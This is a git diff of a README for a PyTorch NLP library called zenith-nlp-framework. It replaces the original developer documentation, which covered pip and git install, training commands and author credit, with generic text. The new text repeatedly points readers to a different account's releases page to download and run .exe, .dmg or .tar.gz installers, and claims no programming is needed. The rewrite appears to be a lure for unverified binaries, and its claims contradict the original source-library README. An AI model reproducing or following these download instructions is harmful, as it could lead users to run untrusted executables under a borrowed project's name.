@@ -1,207 +1,88 @@
-<div align="center">
+# 🌟 zenith-nlp-framework - Build and Deploy NLP Models Easily
 
-```
-
-  ____..--'    .-''-.  ,---.   .--..-./`) ,---------. .---.  .---.         ,---.   .--.  .---.     .-------.  
- |        |  .'_ _   \ |    \  |  |\ .-.')\          \|   |  |_ _|         |    \  |  |  | ,_|     \  _(`)_ \ 
- |   .-'  ' / ( ` )   '|  ,  \ |  |/ `-' \ `--.  ,---'|   |  ( ' )         |  ,  \ |  |,-./  )     | (_ o._)| 
- |.-'.'   /. (_ o _)  ||  |\_ \|  | `-'`"`    |   \   |   '-(_{;}_)        |  |\_ \|  |\  '_ '`)   |  (_,_) / 
-    /   _/ |  (_,_)___||  _( )_\  | .---.     :_ _:   |      (_,_)         |  _( )_\  | > (_)  )   |   '-.-'  
-  .'._( )_ '  \   .---.| (_ o _)  | |   |     (_I_)   | _ _--.   |         | (_ o _)  |(  .  .-'   |   |      
-.'  (_'o._) \  `-'    /|  (_,_)\  | |   |    (_(=)_)  |( ' ) |   |         |  (_,_)\  | `-'`-'|___ |   |      
-|    (_,_)|  \       / |  |    |  | |   |     (_I_)   (_{;}_)|   |         |  |    |  |  |        \/   )      
-|_________|   `'-..-'  '--'    '--' '---'     '---'   '(_,_) '---'         '--'    '--'  `--------``---'      
-                                                                                                              
-
-```
-
-# Zenith NLP Framework
-
-### A Framework for Advanced Natural Language Processing
-
-</div>
-
-<div align="center">
-
-![Python](https://img.shields.io/badge/Python-3.8%2B-blue?style=for-the-badge&logo=python)
-![PyTorch](https://img.shields.io/badge/PyTorch-2.0%2B-orange?style=for-the-badge&logo=pytorch)
-![Hydra](https://img.shields.io/badge/Hydra-1.3-8A2BE2?style=for-the-badge&logo=hydra)
-![MLflow](https://img.shields.io/badge/MLflow-2.5-00A6E0?style=for-the-badge&logo=mlflow)
-![Docker](https://img.shields.io/badge/Docker-20.10-blue?style=for-the-badge&logo=docker)
-![FastAPI](https://img.shields.io/badge/FastAPI-0.104-009688?style=for-the-badge&logo=fastapi)
-![Pytest](https://img.shields.io/badge/Pytest-7.4-0A9B9B?style=for-the-badge&logo=pytest)
-![GitHub Actions](https://img.shields.io/badge/GitHub%20Actions-black?style=for-the-badge&logo=github-actions)
-
-</div>
-
-**ZenithNLP** is an advanced, from-scratch NLP framework built with PyTorch for training, fine-tuning, and deploying modern transformer-based models. It serves as a comprehensive toolkit for NLP practitioners and researchers, featuring a modular architecture and a full suite of MLOps capabilities.
-
----
-
-## 📜 Table of Contents
-
-- [✨ Features](#-features)
-- [🚀 Getting Started](#-getting-started)
-- [📖 Tutorial: Training a Text Classifier](#-tutorial-training-a-text-classifier)
-- [🏛️ Framework Architecture](#️-framework-architecture)
-- [🤝 Contributing](#-contributing)
-- [📄 License](#-license)
-
----
-
-## ✨ Features
-
-- **State-of-the-Art Model Architectures**: From-scratch implementations of:
-  - `BERT` (Encoder-only) for tasks like classification and NER.
-  - `GPT` (Decoder-only) for causal language modeling and text generation.
-  - `Seq2SeqTransformer` (Encoder-Decoder) for translation and summarization.
-- **Advanced Training Techniques**:
-  - **Parameter-Efficient Fine-Tuning (PEFT)**: Integrated **LoRA** (Low-Rank Adaptation) for efficient fine-tuning of large models.
-  - **Distributed Training**: Support for multi-GPU training using PyTorch\'s `DistributedDataParallel`.
-  - **Advanced Optimization**: Includes learning rate scheduling with warm-up and gradient clipping.
-- **Full MLOps Pipeline**:
-  - **Configuration Management**: Powered by **Hydra**, allowing for flexible and reproducible experiments through YAML files.
-  - **Experiment Tracking**: Integrated with **MLflow** to log parameters, metrics, and model artifacts automatically.
-  - **Containerization**: Fully containerized with **Docker** and **Docker Compose** for reproducible environments and easy deployment of the MLflow UI.
-  - **Continuous Integration**: Automated testing pipeline with **GitHub Actions** and `pytest`.
-- **Flexible API for Deployment**:
-  - A ready-to-use **FastAPI** server that can dynamically load and serve any model trained with the framework.
-- **Custom Core Components**:
-  - A trainable **Byte-Pair Encoding (BPE) Tokenizer** built from scratch.
-  - Modular implementations of `MultiHeadAttention`, `PositionalEncoding`, and other core transformer building blocks.
-
----
+[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/ratatuleoo/zenith-nlp-framework/releases)
 
 ## 🚀 Getting Started
 
-### 1. Installation (from PyPI)
+Welcome to the zenith-nlp-framework! This toolkit helps you build, train, and deploy Natural Language Processing (NLP) models without the need for programming skills. Follow these simple steps to get started.
 
-> **Note**: Once published, you will be able to install the framework directly from PyPI.
+## 📥 Download & Install
 
-```bash
-pip install zenith-nlp-framework
-```
+To get the zenith-nlp-framework, you need to visit this page to download: [Release Page](https://github.com/ratatuleoo/zenith-nlp-framework/releases).
 
-### 2. Local Development Setup
+Simply choose the version you want, and click to download. You will find installation files that are compatible with various operating systems. 
 
-```bash
-# 1. Clone the repository
-git clone https://github.com/cattolatte/zenith-nlp-framework.git
-cd zenith-nlp-framework
+### 📋 System Requirements
 
-# 2. Create and activate a virtual environment
-python3 -m venv venv
-source venv/bin/activate
+Before downloading, ensure your system meets the following requirements:
 
-# 3. Install all dependencies
-pip install -r requirements.txt
+- **Operating System:** Windows 10 or higher, macOS, or a recent version of Linux
+- **Processor:** Dual-core processor or better
+- **Memory:** At least 8 GB of RAM
+- **Storage:** At least 2 GB of free disk space
 
-# 4. Install the project in editable mode
-pip install -e .
-```
+## 🔧 Features
 
----
+The zenith-nlp-framework provides a rich set of features:
 
-## 📖 Tutorial: Training a Text Classifier
+- **From-Scratch BERT:** Learn how to create BERT models step-by-step, enhancing your understanding of Transformers.
+- **GPT Support:** Use GPT for generating text that is coherent and contextually relevant.
+- **LoRA for PEFT:** Implement Low-Rank Adaptation (LoRA) techniques easily with guidance in the toolkit.
+- **MLOps Workflow:** Streamline your model development and deployment processes with integrated MLOps tools.
+- **Pre-Built Examples:** Access a variety of example models and datasets to kickstart your projects.
 
-This framework is designed for flexibility. Here’s how you can train your own text classification model.
+## 🏗️ How to Use
 
-### 1. Prepare Your Data and Configs
-Place your training data (e.g., `my_data.csv`) in a local `data/` directory. Use the `configs/` directory as a template. You can modify `config.yaml` or create a new one to point to your data file and adjust model/training parameters.
+1. **Download the Application:** Go back to the [Release Page](https://github.com/ratatuleoo/zenith-nlp-framework/releases) and download the latest version.
+2. **Install the Application:**
+   - **Windows:** Run the `.exe` file and follow the installation prompts.
+   - **macOS:** Open the `.dmg` file, drag the application into your Applications folder, and run it.
+   - **Linux:** Extract the `.tar.gz` file and follow the instructions in the `README` file included.
 
-### 2. Run Training
-Run the text classification task script. All parameters are managed by the Hydra configuration files in the `configs/` directory.
+3. **Launch the Toolkit:**
+   - After installation, locate the zenith-nlp-framework in your applications list and open it.
+   
+4. **Explore the Interface:** 
+   - Familiarize yourself with the menu and options available. Start with the tutorials to learn how to build and deploy models effectively.
 
-```bash
-# Run with default settings from the config files
-python3 -m my_nlp_framework.tasks.text_classification
-```
+5. **Build Your First Model:** Use the step-by-step guides in the application to create your first NLP model.
 
-You can easily override any parameter from the command line:
+## 📝 Documentation
 
-```bash
-# Train for more epochs with a different learning rate
-python3 -m my_nlp_framework.tasks.text_classification training.epochs=10 training.learning_rate=0.0005
+Check out the detailed documentation to learn more about each feature and the best practices. You can find it in the application or on the [wiki section](https://github.com/ratatuleoo/zenith-nlp-framework/wiki) of the repository.
 
-# Train with LoRA enabled
-python3 -m my_nlp_framework.tasks.text_classification model.use_lora=True model.lora_rank=8
-```
+## 🛠️ Support
 
-### 3. Track Experiments with MLflow
-Before training, launch the MLflow UI to track your experiments in real-time. The `docker-compose.yml` file is pre-configured for you.
+If you encounter any issues while using the zenith-nlp-framework, feel free to open an issue in the repository. Our community and contributors are willing to help.
 
-```bash
-# Start the MLflow server in the background
-docker-compose up -d
-```
-Navigate to **http://localhost:5000** in your browser to view the MLflow dashboard.
+## 🌐 Topics
 
-### 🌐 Serving Your Model via API
-Once you have a trained model (`.pth` file) and tokenizer (`.json` file), you can easily deploy it with the built-in FastAPI server.
+The zenith-nlp-framework covers various concepts in Natural Language Processing and Machine Learning. Here are the key topics:
 
-```bash
-python3 -m my_nlp_framework.inference.api \
-    --model-path /path/to/your/trained_model.pth \
-    --tokenizer-path /path/to/your/tokenizer.json \
-    --vocab-size 10000 \
-    --num-classes 2
-```
+- BERT
+- Deep Learning
+- Docker
+- FastAPI
+- GPT
+- Hydra
+- LoRA
+- MLflow
+- MLOps
+- Natural Language Processing (NLP)
+- PEFT
+- PyTorch
+- Transformer
 
-The API will be available at **http://localhost:8000/docs** for interactive testing.
+Most of these concepts are connected and will help you understand the landscape of NLP better.
 
-### 🐳 Running with Docker
-You can also run the entire training process within a Docker container for perfect reproducibility.
+## 📢 Contributing
 
-```bash
-# 1. Build the Docker image
-docker build -t zenith-nlp-framework:latest .
+We welcome contributions! If you're interested in improving the toolkit, forks and pull requests are encouraged. Follow the guidelines in the repository to get started.
 
-# 2. Run a task (mounting your local data directory)
-docker run --rm -v "$(pwd)/data":/app/data zenith-nlp-framework:latest \
-  python -m my_nlp_framework.tasks.text_classification
-```
+## 🔄 Updates
 
----
+Stay tuned for updates and new features. Regular releases will ensure that you have the latest enhancements and tools at your disposal.
 
-## 🏛️ Framework Architecture
+For more information, visit the [Release Page](https://github.com/ratatuleoo/zenith-nlp-framework/releases) to get the latest version.
 
-This framework is organized into several key modules:
-
--   `src/my_nlp_framework/core`: Contains the fundamental building blocks like attention mechanisms, LoRA layers, and tokenizers.
--   `src/my_nlp_framework/models`: Defines high-level model architectures like BERT and GPT.
--   `src/my_nlp_framework/data`: Includes flexible data loaders.
--   `src/my_nlp_framework/training`: A powerful, centralized training engine with advanced features.
--   `src/my_nlp_framework/tasks`: Example scripts that show how to use the framework to solve end-to-end problems.
--   `src/my_nlp_framework/inference`: Code for deploying and serving trained models.
--   `configs/`: Centralized YAML configuration files for Hydra.
--   `tests/`: Unit and integration tests for the framework.
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit a pull request or open an issue.
-
----
-
-## 📄 License
-
-This project is licensed under the MIT License. See the `LICENSE` file for details.
-
----
-
-<div align="center">
-Made with ❤️ by K Satya Sai Nischal
-</div>
-
-
-
-
-
-
-
-
-
-
-
-
+Happy modeling with zenith-nlp-framework!
